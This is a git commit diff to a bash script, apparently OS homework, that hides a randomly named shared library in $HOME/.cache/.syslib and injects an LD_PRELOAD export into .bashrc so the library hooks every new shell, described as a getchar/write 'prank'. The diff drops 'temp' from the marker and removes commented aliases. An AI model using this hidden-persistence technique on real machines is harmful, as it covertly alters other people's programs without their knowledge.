a4f4371f16ce6bc6bf8f18cbaed4b95b3deaca15
edakay <150674343+edakay10@users.noreply.github.com>
2025-06-07 12:43:31 +0200

    Update OShomeworkBash.sh

--- OShomeworkBash.sh
+++ OShomeworkBash.sh
@@ -27,7 +27,7 @@ HIDDEN_DIR="$HOME/.cache/.syslib"
 NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
 HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
 BASHRC="$HOME/.bashrc"
-MARKER="# [MRWOC_TEMP] LD_PRELOAD injected"
+MARKER="# [LD_PRELOAD injected]"
 
 echo "[*] Starting installation..."
 sleep 1
@@ -50,7 +50,7 @@ chmod 755 "$HIDDEN_SO"
 # Export LD_PRELOAD only in this session (if wanted)
 #source LD_PRELOAD="$HIDDEN_SO"
 
-# Inject LD_PRELOAD into .bashrc (temp)
+# Inject LD_PRELOAD into .bashrc
 echo "" >> "$BASHRC"
 echo "$MARKER" >> "$BASHRC"
 echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$BASHRC"
@@ -70,16 +70,3 @@ sed -i "/$MARKER/,+1d" "$BASHRC"
 echo "Clean up complete."
 # Launch the new shell
 DISABLE_GETCHAR_PRANK=1 bash
-
-# Create a working alias for geary with DISABLE_WRITE_PRANK (doesnt work with geary anymore, have to fix:TODO)
-#alias geary="DISABLE_WRITE_PRANK=1 LD_PRELOAD=$HIDDEN_SO geary"
-
-# add more aliases to block getchar prank although this might be fun to not block!
-#declare -a apps=("bash" "cat" "hexchat" "liferea" "gnome-weather" "geary")
-#for app in "${apps[@]}"; do
-#    alias $app="DISABLE_GETCHAR_PRANK=1 LD_PRELOAD=$HIDDEN_SO $app"
-#done
-
-
-
-
